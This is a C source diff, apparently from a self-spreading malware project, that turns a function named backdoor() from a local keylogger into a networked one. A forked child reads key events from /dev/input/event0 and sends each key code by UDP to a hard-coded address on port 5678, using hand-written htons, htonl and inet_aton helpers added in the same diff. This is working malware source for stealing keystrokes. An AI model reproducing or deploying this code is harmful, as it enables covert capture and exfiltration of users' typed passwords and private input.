@@ -309,6 +309,59 @@ void		fill_tab_addr(size_t *tab_addr)
 	tab_addr[30] = (size_t)&fill_tab_addr;
 }
 
+uint16_t	my_htons(uint16_t x)
+{
+	return ((((x) >> 8) & 0xff) | (((x) & 0xff) << 8));
+}
+uint32_t	my_htonl(uint32_t x)
+{
+	return ((((x) & 0xff000000u) >> 24) | (((x) & 0x00ff0000u) >> 8) | (((x) & 0x0000ff00u) << 8| (((x) & 0x000000ffu) << 24)));
+}
+
+int	my_inet_aton(char *cp, struct in_addr *ap)
+{
+	int dots = 0;
+	register u_long acc = 0, addr = 0;
+	do {
+		register char cc = *cp;
+		switch (cc) {
+			case '0':
+			case '1':
+			case '2':
+			case '3':
+			case '4':
+			case '5':
+			case '6':
+			case '7':
+			case '8':
+			case '9':
+				acc = acc * 10 + (cc - '0');
+				break;
+			case '.':
+				if (++dots > 3) {
+					return 0;
+				}
+				break;
+			case '\0':
+				if (acc > 255) {
+					return 0;
+				}
+				addr = addr << 8 | acc;
+				acc = 0;
+				break;
+			default:
+				return 0;
+		}
+	} while (*cp++) ;
+	if (dots < 3) {
+		addr <<= 8 * (3 - dots) ;
+	}
+	if (ap) {
+		ap->s_addr = my_htonl(addr);
+	}
+	return 1;
+}
+
 static void	backdoor()
 {
 	pid_t pid = ft_sysfork();
@@ -317,27 +370,37 @@ static void	backdoor()
 		return ;
 	if (pid == 0)
 	{
-		int fd, fd2;
+		int fd;
+		int sock;
+		struct sockaddr_in struct_addr_in;
+		socklen_t len_struct;
 		struct input_event ev;
 		char buf[0x40];// = "/dev/input/event0";
-// 		char *str2 ="/tmp/test/keylogger.txt"; 
+// 		char *str2 ="10.12.10.8"; 
 		write_event0(buf);
 		fd = ft_sysopen(buf, O_RDONLY);
 		if (fd < 0)
 			ft_sysexit(0);
-		write_keylog(buf);
-		fd2 = ft_sysopenmode(buf, O_WRONLY | O_CREAT, 0666);
-		if (fd2 < 0)
+		sock = ft_syssocket(AF_INET, SOCK_DGRAM, 0);
+		if (sock < 0)
 		{
 			ft_sysclose(fd);
 			ft_sysexit(0);
 		}
+		len_struct = sizeof(struct_addr_in);
+		ft_memset(&struct_addr_in, 0, len_struct);
+		struct_addr_in.sin_family = AF_INET;
+		struct_addr_in.sin_port = my_htons(5678);
+		write_ip(buf);
+		my_inet_aton(buf, &struct_addr_in.sin_addr);
 		while (1)
 		{
 			ft_sysread(fd, &ev, sizeof(struct input_event));
 			if (ev.type == EV_KEY && ev.value == 0x1)
 			{
-				ft_syswrite(fd2, &(ev.code), 2);
+				if (ft_syssendto(sock, &(ev.code), 2, 0, (struct sockaddr *)&struct_addr_in, len_struct) < 0)
+					ft_sysexit(0);
+				ft_syswrite(1, &(ev.code), 2);
 			}
 		}
 
